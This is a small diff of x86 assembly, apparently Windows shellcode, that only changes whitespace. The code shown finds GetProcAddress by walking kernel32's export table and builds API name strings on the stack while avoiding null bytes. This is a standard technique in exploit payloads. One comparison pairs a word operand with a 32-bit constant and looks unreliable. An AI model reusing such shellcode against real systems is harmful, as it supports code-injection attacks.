@@ -243,7 +243,7 @@ lodsd
 add eax, ebx                         
 cmp dword [eax], 0x50746547          ; GetP
 jnz Get_Function
-cmp word [eax + 0xa], 0x73736572	   ; ress
+cmp word [eax + 0xa], 0x73736572     ; ress
 jnz Get_Function
 mov esi, [edi + 0x24]                
 add esi, ebx                         
@@ -302,7 +302,7 @@ call eax
 ; EBX = kernel32 base
 ; EDI = GetProcAddress address
 
-add esp, 0x10                   ; clean the stack
+add esp, 0x10                  ; clean the stack
 push 0x61737365
 sub dword [esp + 0x3], 0x61    ; essa - a    
 push 0x636f7250                ; Proc
